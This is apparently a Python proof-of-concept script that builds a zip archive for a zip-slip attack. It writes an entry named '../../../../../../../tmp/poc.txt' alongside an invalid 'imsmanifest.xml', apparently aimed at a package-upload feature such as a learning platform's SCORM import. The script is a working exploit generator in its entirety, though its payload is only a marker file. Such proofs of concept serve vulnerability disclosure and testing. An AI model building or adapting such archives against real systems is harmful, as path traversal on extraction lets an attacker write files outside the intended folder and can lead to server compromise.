#!/usr/bin/python3
import zipfile
from io import BytesIO

filename = "poc.zip"

def build_zip():
    f = BytesIO()
    with zipfile.ZipFile(f, mode='w', compression=zipfile.ZIP_DEFLATED) as zf:
        zf.writestr("../../../../../../../tmp/poc.txt", "TESTSTRING")
        zf.writestr('imsmanifest.xml', 'invalid xml!')
    zip = open(filename,'wb')
    zip.write(f.getvalue())
    zip.close()

build_zip()

